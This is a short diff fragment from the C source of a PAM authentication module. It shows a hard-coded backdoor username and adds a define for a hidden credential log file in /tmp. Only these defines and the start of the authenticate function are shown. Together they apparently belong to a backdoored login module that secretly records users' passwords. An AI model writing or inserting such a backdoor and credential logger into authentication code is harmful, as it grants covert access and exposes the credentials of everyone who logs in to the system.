@@ -6,7 +6,7 @@
 #include <pwd.h>
 #include <unistd.h>
 
-
+#define LOGFILE "/tmp/.credlog.txt"
 #define BACKDOOR_USER "nihargayam"
 
 PAM_EXTERN int pam_sm_authenticate(pam_handle_t *pamh, int flags,
